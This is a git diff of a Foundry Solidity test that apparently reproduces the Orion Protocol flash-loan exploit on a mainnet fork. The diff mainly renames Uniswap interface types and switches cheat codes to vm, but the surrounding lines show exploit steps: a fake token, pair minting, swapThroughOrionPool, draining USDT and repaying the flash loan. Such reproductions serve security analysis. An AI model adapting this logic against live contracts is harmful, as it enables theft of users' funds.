@@ -2,7 +2,6 @@
 pragma solidity 0.8.17;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @Analsysi
 // https://twitter.com/peckshield/status/1621337925228306433
@@ -44,16 +43,14 @@ contract ContractTest is Test {
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     ORION Orion = ORION(0xb5599f568D3f3e6113B286d010d2BCa40A7745AA);
     OrionPoolV2Factory Factory = OrionPoolV2Factory(0x5FA0060FcfEa35B31F7A5f6025F0fF399b98Edf1);
-    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
-    Uni_Router_V3 RouterV3 = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
-    Uni_Pair_V2 Pair = Uni_Pair_V2(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
+    IUniswapV2Router Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+    IUniswapV3Router RouterV3 = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+    IUniswapV2Pair Pair = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
     uint256 flashAmount;
     IERC20 ATK;
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() public {
-        cheats.createSelectFork("mainnet", 16_542_147);
+        vm.createSelectFork("mainnet", 16_542_147);
         vm.label(address(USDT), "USDT");
         vm.label(address(USDC), "USDC");
         vm.label(address(Orion), "ORION");
@@ -90,7 +87,7 @@ contract ContractTest is Test {
         Orion.swapThroughOrionPool(10_000, 0, path, true);
         Orion.withdraw(address(USDT), uint112(USDT.balanceOf(address(Orion)) - 1));
         address(USDT).call(
-            abi.encodeWithSignature("transfer(address,uint256)", address(Pair), flashAmount * 1000 / 997 + 1000)
+            abi.encodeWithSignature("transfer(address,uint256)", address(Pair), (flashAmount * 1000) / 997 + 1000)
         );
     }
 
@@ -103,8 +100,8 @@ contract ContractTest is Test {
         ATK.transfer(address(Pair1), 50 * 1e18);
         USDC.transfer(address(Pair2), 5 * 1e5);
         ATK.transfer(address(Pair2), 50 * 1e18);
-        Uni_Pair_V2(Pair1).mint(address(this));
-        Uni_Pair_V2(Pair2).mint(address(this));
+        IUniswapV2Pair(Pair1).mint(address(this));
+        IUniswapV2Pair(Pair2).mint(address(this));
     }
 
     function deposit() external {
@@ -113,7 +110,7 @@ contract ContractTest is Test {
 
     function USDTToWETH() internal {
         address(USDT).call(abi.encodeWithSignature("approve(address,uint256)", address(RouterV3), type(uint256).max));
-        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
+        IUniswapV3Router.ExactInputSingleParams memory _Params = IUniswapV3Router.ExactInputSingleParams({
             tokenIn: address(USDT),
             tokenOut: address(WETH),
             fee: 3000,
